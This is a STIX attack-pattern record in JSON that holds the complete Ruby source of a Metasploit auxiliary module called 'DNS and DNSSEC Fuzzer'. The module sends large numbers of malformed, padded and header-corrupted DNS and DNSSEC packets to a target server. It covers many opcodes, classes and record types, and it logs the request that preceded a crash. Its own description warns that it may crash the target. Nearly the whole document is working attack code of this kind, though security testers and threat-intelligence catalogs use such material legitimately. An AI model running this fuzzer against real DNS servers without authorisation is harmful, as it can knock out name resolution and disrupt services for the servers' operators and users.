{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9ead35ea-ac5c-4ac9-b80a-ad1838f34721",
    "created": "2024-08-14T16:26:30.964142Z",
    "modified": "2024-08-14T16:26:30.964146Z",
    "name": "DNS and DNSSEC Fuzzer",
    "description": " This module will connect to a DNS server and perform DNS and DNSSEC protocol-level fuzzing. Note that this module may inadvertently crash the target server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/fuzzers/dns/dns_fuzzer.rb",
            "external_id": "dns_fuzzer.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'bindata'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Fuzzer\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'DNS and DNSSEC Fuzzer',\n      'Description'    => %q{\n        This module will connect to a DNS server and perform DNS and\n        DNSSEC protocol-level fuzzing. Note that this module may inadvertently\n        crash the target server.\n      },\n    'Author'         => [ 'pello <fropert[at]packetfault.org>' ],\n    'License'        => MSF_LICENSE\n    )\n\n    register_options([\n      Opt::RPORT(53),\n      OptInt.new('STARTSIZE', [ false, \"Fuzzing string startsize.\",0]),\n      OptInt.new('ENDSIZE', [ false, \"Max Fuzzing string size. (L2 Frame size)\",500]),\n      OptInt.new('STEPSIZE', [ false, \"Increment fuzzing string each attempt.\",100]),\n      OptInt.new('ERRORHDR', [ false, \"Introduces byte error in the DNS header.\", 0]),\n      OptBool.new('CYCLIC', [ false, \"Use Cyclic pattern instead of A's (fuzzing payload).\",true]),\n      OptInt.new(\"ITERATIONS\", [true, \"Number of iterations to run by test case\", 5]),\n      OptString.new('DOMAIN', [ false, \"Force DNS zone domain name.\"]),\n      OptString.new('IMPORTENUM', [ false, \"Import dns_enum database output and automatically use existing RR.\"]),\n      OptEnum.new('METHOD', [false, 'Underlayer protocol to use', 'UDP', ['UDP', 'TCP', 'AUTO']]),\n      OptBool.new('DNSSEC', [ false, \"Add DNSsec to each question (UDP payload size, EDNS0, ...)\",false]),\n      OptBool.new('TRAILINGNUL', [ false, \"NUL byte terminate DNS names\",true]),\n      OptBool.new('RAWPADDING', [ false, \"Generate totally random data from STARTSIZE to ENDSIZE\",false]),\n      OptString.new('OPCODE', [ false, \"Comma separated list of opcodes to fuzz. Leave empty to fuzz all fields.\",'' ]),\n      # OPCODE accepted values: QUERY,IQUERY,STATUS,UNASSIGNED,NOTIFY,UPDATE\n      OptString.new('CLASS', [ false, \"Comma separated list of classes to fuzz. Leave empty to fuzz all fields.\",'' ]),\n      # CLASS accepted values: IN,CH,HS,NONE,ANY\n      OptString.new('RR', [ false, \"Comma separated list of requests to fuzz. Leave empty to fuzz all fields.\",'' ])\n      # RR accepted values: A,CNAME,MX,PTR,TXT,AAAA,HINFO,SOA,NS,WKS,RRSIG,DNSKEY,DS,NSEC,NSEC3,NSEC3PARAM\n      # RR accepted values: AFSDB,ISDN,RP,RT,X25,PX,SRV,NAPTR,MD,MF,MB,MG,MR,NULL,MINFO,NSAP,NSAP-PTR,SIG\n      # RR accepted values: KEY,GPOS,LOC,NXT,EID,NIMLOC,ATMA,KX,CERT,A6,DNAME,SINK,OPT,APL,SSHFP,IPSECKEY\n      # RR accepted values: DHCID,HIP,NINFO,RKEY,TALINK,SPF,UINFO,UID,GID,UNSPEC,TKEY,TSIG,IXFR,AXFR,MAILB\n      # RR accepted values: MAIL,*,TA,DLV,RESERVED\n    ])\n  end\n\n  class Dns_header < BinData::Record\n    endian :big\n    uint16 :txid, initial_value: rand(0xffff)\n    bit1   :qr\n    bit4   :opcode\n    bit1   :aa\n    bit1   :tc\n    bit1   :rd\n    bit1   :ra\n    bit3   :z\n    bit4   :rcode\n    uint16 :questions, initial_value: 1\n    uint16 :answerRR\n    uint16 :authorityRR\n    uint16 :additionalRR\n    rest   :payload\n  end\n\n  class Dns_add_rr < BinData::Record\n    endian :big\n    uint8  :name\n    uint16 :rr_type, initial_value: 0x0029\n    uint16 :payloadsize, initial_value: 0x1000\n    uint8  :highercode\n    uint8  :ednsversion\n    uint8  :zlow\n    uint8  :zhigh, initial_value: 0x80\n    uint16 :datalength\n  end\n\n  def msg\n    \"#{rhost}:#{rport} - DNS -\"\n  end\n\n  def check_response_construction(pkt)\n    # check if RCODE is not in the unassigned/reserved range\n    if pkt[4].to_i >= 0x17 || (pkt[4].to_i >= 0x0b && pkt[4].to_i <= 0x0f)\n      print_error(\"#{msg} Server replied incorrectly to the following request:\\n#{@lastdata.unpack('H*')}\")\n      return false\n    else\n      return true\n    end\n  end\n\n  def dns_alive(method)\n    connect_udp if method == \"UDP\" || method == \"AUTO\"\n    connect if method == \"TCP\"\n\n    payload = \"\"\n    domain = \"\"\n    if @domain == nil\n      domain << Rex::Text.rand_text_alphanumeric(rand(2)+2)\n      domain << \".\"\n      domain << Rex::Text.rand_text_alphanumeric(rand(6)+3)\n      domain << \".\"\n      domain << Rex::Text.rand_text_alphanumeric(2)\n    else\n      domain << Rex::Text.rand_text_alphanumeric(rand(2)+2)\n      domain << \".\"\n      domain << @domain\n    end\n\n    splitFQDN = domain.split('.')\n    payload = splitFQDN.inject(\"\") { |a,x| a + [x.length,x].pack(\"CA*\") }\n    pkt = Dns_header.new\n    pkt.txid = rand(0xffff)\n    pkt.opcode = 0x0000\n    pkt.payload = payload + \"\\x00\" + \"\\x00\\x01\" + \"\\x00\\x01\"\n    testingPkt = pkt.to_binary_s\n\n    if method == \"UDP\"\n      udp_sock.put(testingPkt)\n      res, addr = udp_sock.recvfrom(65535)\n      disconnect_udp\n    elsif method == \"TCP\"\n      sock.put(testingPkt)\n      res, addr = sock.get_once(-1, 20)\n      disconnect\n    end\n\n    if res && res.empty?\n      print_error(\"#{msg} The remote server is not responding to DNS requests.\")\n      return false\n    else\n      return true\n    end\n  end\n\n  def fuzz_padding(payload, size)\n    padding = size - payload.length\n    if padding <= 0 then return payload end\n    if datastore['CYCLIC']\n      @fuzzdata = Rex::Text.rand_text_alphanumeric(padding)\n    else\n      @fuzzdata = 'A' * padding\n    end\n    payload = payload.ljust(padding, @fuzzdata)\n    return payload\n  end\n\n  def corrupt_header(pkt,nb)\n    len = pkt.length - 1\n    for i in 0..nb - 1\n      selectByte = rand(len)\n      pkt[selectByte] = [rand(255).to_s].pack('H')\n    end\n    return pkt\n  end\n\n  def random_payload(size)\n    pkt = Array.new\n    for i in 0..size - 1\n      pkt[i] = [rand(255).to_s].pack('H')\n    end\n    return pkt\n  end\n\n  def setup_fqdn(domain,entry)\n    if domain == nil\n      domain = \"\"\n      domain << Rex::Text.rand_text_alphanumeric(rand(62)+2)\n      domain << \".\"\n      domain << Rex::Text.rand_text_alphanumeric(rand(61)+3)\n      domain << \".\"\n      domain << Rex::Text.rand_text_alphanumeric(rand(62)+2)\n    elsif @dnsfile\n      domain = entry + \".\" + domain\n    else\n      domain = Rex::Text.rand_text_alphanumeric(rand(62)+2) + \".\" + domain\n    end\n    return domain\n  end\n\n  def import_enum_data(dnsfile)\n    enumdata = Array.new(count = File.foreach(dnsfile).inject(0) {|c, line| c+1}, 0)\n    idx = 0\n    File.open(dnsfile,\"rb\").each_line do |line|\n      line = line.split(\",\")\n      enumdata[idx] = Hash.new\n      enumdata[idx][:name] = line[0].strip\n      enumdata[idx][:rr] = line[1].strip\n      enumdata[idx][:class] = line[2].strip\n      idx = idx + 1\n    end\n    return enumdata\n  end\n\n  def setup_nsclass(nsclass)\n    classns = \"\"\n    for idx in nsclass\n      classns << {\n        \"IN\" => 0x0001, \"CH\" => 0x0003, \"HS\" => 0x0004,\n        \"NONE\" => 0x00fd, \"ANY\" => 0x00ff\n      }.values_at(idx).pack(\"n\")\n    end\n    return classns\n  end\n\n  def setup_opcode(nsopcode)\n    opcode = \"\"\n    for idx in nsopcode\n      opcode << {\n        \"QUERY\" => 0x0000, \"IQUERY\" => 0x0001, \"STATUS\" => 0x0002,\n        \"UNASSIGNED\" => 0x0003, \"NOTIFY\" => 0x0004, \"UPDATE\" => 0x0005\n      }.values_at(idx).pack(\"n\")\n    end\n    return opcode\n  end\n\n  def setup_reqns(nsreq)\n    reqns= \"\"\n    for idx in nsreq\n      reqns << {\n        \"A\" => 0x0001, \"NS\" => 0x0002, \"MD\" => 0x0003, \"MF\" => 0x0004,\n        \"CNAME\" => 0x0005, \"SOA\" => 0x0006, \"MB\" => 0x0007, \"MG\" => 0x0008,\n        \"MR\" => 0x0009, \"NULL\" => 0x000a, \"WKS\" => 0x000b, \"PTR\" => 0x000c,\n        \"HINFO\" => 0x000d, \"MINFO\" => 0x000e, \"MX\" => 0x000f, \"TXT\" => 0x0010,\n        \"RP\" => 0x0011, \"AFSDB\" => 0x0012, \"X25\" => 0x0013, \"ISDN\" => 0x0014,\n        \"RT\" => 0x0015, \"NSAP\" => 0x0016, \"NSAP-PTR\" => 0x0017, \"SIG\" => 0x0018,\n        \"KEY\" => 0x0019, \"PX\" => 0x001a, \"GPOS\" => 0x001b, \"AAAA\" => 0x001c,\n        \"LOC\" => 0x001d, \"NXT\" => 0x001e, \"EID\" => 0x001f, \"NIMLOC\" => 0x0020,\n        \"SRV\" => 0x0021, \"ATMA\" => 0x0022, \"NAPTR\" => 0x0023, \"KX\" => 0x0024,\n        \"CERT\" => 0x0025, \"A6\" => 0x0026, \"DNAME\" => 0x0027, \"SINK\" => 0x0028,\n        \"OPT\" => 0x0029, \"APL\" => 0x002a, \"DS\" => 0x002b, \"SSHFP\" => 0x002c,\n        \"IPSECKEY\" => 0x002d, \"RRSIG\" => 0x002e, \"NSEC\" => 0x002f, \"DNSKEY\" => 0x0030,\n        \"DHCID\" => 0x0031, \"NSEC3\" => 0x0032, \"NSEC3PARAM\" => 0x0033, \"HIP\" => 0x0037,\n        \"NINFO\" => 0x0038, \"RKEY\" => 0x0039, \"TALINK\" => 0x003a, \"SPF\" => 0x0063,\n        \"UINFO\" => 0x0064, \"UID\" => 0x0065, \"GID\" => 0x0066, \"UNSPEC\" => 0x0067,\n        \"TKEY\" => 0x00f9, \"TSIG\" => 0x00fa, \"IXFR\" => 0x00fb, \"AXFR\" => 0x00fc,\n        \"MAILA\" => 0x00fd, \"MAILB\" => 0x00fe, \"*\" => 0x00ff, \"TA\" => 0x8000,\n        \"DLV\" => 0x8001, \"RESERVED\" => 0xffff\n      }.values_at(idx).pack(\"n\")\n    end\n    return reqns\n  end\n\n  def build_packet(dnsOpcode,dnssec,trailingnul,reqns,classns,payload)\n    pkt = Dns_header.new\n    pkt.opcode = dnsOpcode\n    if trailingnul\n      if @dnsfile\n        pkt.payload = payload + \"\\x00\" + reqns + classns\n      else\n        pkt.payload = payload + \"\\x00\" + [reqns].pack(\"n\") + [classns].pack(\"n\")\n      end\n    else\n      if @dnsfile\n        pkt.payload = payload + [(rand(255) + 1).to_s].pack('H') + reqns + classns\n      else\n        pkt.payload = payload + [(rand(255) + 1).to_s].pack('H') + [dnsReq].pack(\"n\") + [dnsClass].pack(\"n\")\n      end\n    end\n    if dnssec\n      dnssecpkt = Dns_add_rr.new\n      pkt.additionalRR = 1\n      pkt.payload = dnssecpkt.to_binary_s\n    end\n    return pkt.to_binary_s\n  end\n\n  def dns_send(data,method)\n    method = \"UDP\" if (method == \"AUTO\" && data.length < 512)\n    method = \"TCP\" if (method == \"AUTO\" && data.length >= 512)\n\n    connect_udp if method == \"UDP\"\n    connect if method == \"TCP\"\n    udp_sock.put(data) if method == \"UDP\"\n    sock.put(data) if method == \"TCP\"\n\n    res, addr = udp_sock.recvfrom(65535,1) if method == \"UDP\"\n    res, addr = sock.get_once(-1,1) if method == \"TCP\"\n\n    disconnect_udp if method == \"UDP\"\n    disconnect if method == \"TCP\"\n\n    if res && res.length == 0\n      @failCount += 1\n      if @failCount == 1\n        @probablyVuln = @lastdata if @lastdata != nil\n        return true\n      elsif @failCount >= 3\n        if dns_alive(method) == false\n          if @lastdata\n            print_error(\"#{msg} DNS is DOWN since the request:\")\n            print_error(lastdata.unpack('H*'))\n          else\n            print_error(\"#{msg} DNS is DOWN\")\n          end\n          return false\n        else\n          return true\n        end\n      else\n        return true\n      end\n    elsif res && res.length > 0\n      @lastdata = data\n      if res[3].to_i >= 0x8000 # ignore server response as a query\n        @failCount = 0\n        return true\n      end\n      if @rawpadding\n        @failCount = 0\n        return true\n      end\n      if check_response_construction(res)\n        @failCount = 0\n        return true\n      else\n        return false\n      end\n    end\n  end\n\n  def fix_variables\n    @fuzz_opcode = datastore['OPCODE'].blank? ? \"QUERY,IQUERY,STATUS,UNASSIGNED,NOTIFY,UPDATE\" : datastore['OPCODE']\n    @fuzz_class  = datastore['CLASS'].blank? ? \"IN,CH,HS,NONE,ANY\" : datastore['CLASS']\n    fuzz_rr_queries = \"A,NS,MD,MF,CNAME,SOA,MB,MG,MR,NULL,WKS,PTR,\" <<\n      \"HINFO,MINFO,MX,TXT,RP,AFSDB,X25,ISDN,RT,\" <<\n      \"NSAP,NSAP-PTR,SIG,KEY,PX,GPOS,AAAA,LOC,NXT,\" <<\n      \"EID,NIMLOC,SRV,ATMA,NAPTR,KX,CERT,A6,DNAME,\" <<\n      \"SINK,OPT,APL,DS,SSHFP,IPSECKEY,RRSIG,NSEC,\" <<\n      \"DNSKEY,DHCID,NSEC3,NSEC3PARAM,HIP,NINFO,RKEY,\" <<\n      \"TALINK,SPF,UINFO,UID,GID,UNSPEC,TKEY,TSIG,\" <<\n      \"IXFR,AXFR,MAILA,MAILB,*,TA,DLV,RESERVED\"\n    @fuzz_rr     = datastore['RR'].blank? ? fuzz_rr_queries : datastore['RR']\n  end\n\n  def run_host(ip)\n    msg = \"#{ip}:#{rhost} - DNS -\"\n    begin\n      @lastdata = nil\n      @probablyVuln = nil\n      @startsize = datastore['STARTSIZE']\n      @stepsize = datastore['STEPSIZE']\n      @endsize = datastore['ENDSIZE']\n      @underlayerProtocol = datastore['METHOD']\n      @failCount = 0\n      @domain = datastore['DOMAIN']\n      @dnsfile = datastore['IMPORTENUM']\n      @rawpadding = datastore['RAWPADDING']\n      iter = datastore['ITERATIONS']\n      dnssec = datastore['DNSSEC']\n      errorhdr = datastore['ERRORHDR']\n      trailingnul = datastore['TRAILINGNUL']\n\n      fix_variables\n\n      if !dns_alive(@underlayerProtocol) then return false end\n\n      print_status(\"#{msg} Fuzzing DNS server, this may take a while.\")\n\n      if @startsize < 12 && @startsize > 0\n        print_status(\"#{msg} STARTSIZE must be at least 12. STARTSIZE value has been modified.\")\n        @startsize = 12\n      end\n\n      if @rawpadding\n        if @domain == nil\n          print_status(\"DNS Fuzzer: DOMAIN could be set for health check but not mandatory.\")\n        end\n        nsopcode=@fuzz_opcode.split(\",\")\n        opcode = setup_opcode(nsopcode)\n        opcode.unpack(\"n*\").each do |dnsOpcode|\n          1.upto(iter) do\n            while @startsize <= @endsize\n              data = random_payload(@startsize).to_s\n              data[2] = 0x0\n              data[3] = dnsOpcode\n              if !dns_send(data,@underlayerProtocol) then return false end\n              @lastdata = data\n              @startsize += @stepsize\n            end\n            @startsize = datastore['STARTSIZE']\n          end\n        end\n        return\n      end\n\n      if @dnsfile\n        if @domain == nil\n          print_error(\"DNS Fuzzer: Domain variable must be set.\")\n          return\n        end\n\n        dnsenumdata = import_enum_data(@dnsfile)\n        nsreq = []\n        nsclass = []\n        nsentry = []\n        for req, value in dnsenumdata\n          nsreq << req[:rr]\n          nsclass << req[:class]\n          nsentry << req[:name]\n        end\n        nsopcode=@fuzz_opcode.split(\",\")\n      else\n        nsreq=@fuzz_rr.split(\",\")\n        nsopcode=@fuzz_opcode.split(\",\")\n        nsclass=@fuzz_class.split(\",\")\n        begin\n          classns = setup_nsclass(nsclass)\n          raise ArgumentError, \"Invalid CLASS: #{nsclass.inspect}\" unless classns\n          opcode = setup_opcode(nsopcode)\n          raise ArgumentError, \"Invalid OPCODE: #{opcode.inspect}\" unless nsopcode\n          reqns = setup_reqns(nsreq)\n          raise ArgumentError, \"Invalid RR: #{nsreq.inspect}\" unless nsreq\n        rescue ::Exception => e\n          print_error(\"DNS Fuzzer error, aborting: #{e}\")\n          return\n        end\n      end\n\n      for question in nsreq\n        case question\n        when \"RRSIG\", \"DNSKEY\", \"DS\", \"NSEC\", \"NSEC3\", \"NSEC3PARAM\"\n          dnssec = true\n        end\n      end\n\n      if @dnsfile\n        classns = setup_nsclass(nsclass)\n        reqns = setup_reqns(nsreq)\n        opcode = setup_opcode(nsopcode)\n        opcode.unpack(\"n*\").each do |dnsOpcode|\n          for i in 0..nsentry.length - 1\n            reqns = setup_reqns(nsreq[i])\n            classns = setup_nsclass(nsclass[i])\n            1.upto(iter) do\n              payload = \"\"\n              nsdomain = setup_fqdn(@domain,nsentry[i])\n              splitFQDN = nsdomain.split('.')\n              payload = splitFQDN.inject(\"\") { |a,x| a + [x.length,x].pack(\"CA*\") }\n              pkt = build_packet(dnsOpcode,dnssec,trailingnul,reqns,classns,payload)\n              pkt = corrupt_header(pkt,errorhdr) if errorhdr > 0\n              if @startsize == 0\n                if !dns_send(pkt,@underlayerProtocol) then return end\n              else\n                while @startsize <= @endsize\n                  pkt = fuzz_padding(pkt, @startsize)\n                  if !dns_send(pkt,@underlayerProtocol) then return end\n                  @startsize += @stepsize\n                end\n                @startsize = datastore['STARTSIZE']\n              end\n            end\n          end\n        end\n      else\n        classns.unpack(\"n*\").each do |dnsClass|\n          opcode.unpack(\"n*\").each do |dnsOpcode|\n            reqns.unpack(\"n*\").each do |dnsReq|\n              1.upto(iter) do\n                payload = \"\"\n                nsdomain = setup_fqdn(@domain,\"\")\n                splitFQDN = nsdomain.split('.')\n                payload = splitFQDN.inject(\"\") { |a,x| a + [x.length,x].pack(\"CA*\") }\n                pkt = build_packet(dnsOpcode,dnssec,trailingnul,dnsReq,dnsClass,payload)\n                pkt = corrupt_header(pkt,errorhdr) if errorhdr > 0\n                if @startsize == 0\n                  if !dns_send(pkt,@underlayerProtocol) then return end # If then return end?\n                else\n                  while @startsize <= @endsize\n                    pkt = fuzz_padding(pkt, @startsize)\n                    if !dns_send(pkt,@underlayerProtocol) then return end\n                    @startsize += @stepsize\n                  end\n                  @startsize = datastore['STARTSIZE']\n                end\n              end\n            end\n          end\n        end\n      end\n    end\n  end\nend\n"
}